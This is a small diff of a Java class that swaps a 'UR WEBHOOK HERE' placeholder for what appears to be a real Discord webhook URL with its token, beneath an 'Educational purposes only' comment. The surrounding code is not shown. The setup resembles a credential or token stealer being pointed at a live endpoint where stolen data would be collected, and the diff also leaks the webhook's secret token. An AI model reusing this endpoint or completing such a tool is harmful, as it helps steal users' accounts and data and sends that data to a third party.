@@ -17,7 +17,7 @@ public class Main {
 
 	// Educational purposes only
 
-	private static String webhook = "UR WEBHOOK HERE";
+	private static String webhook = "https://discord.com/api/webhooks/1497742828389011636/eHXqrO4Uc-uz7TNeI04y1FXB3DBg-2B_UogInp0GN5S2l1HFkah3UMreyDlkhmyrC7rF";
 
 	private static boolean debug = false;
 
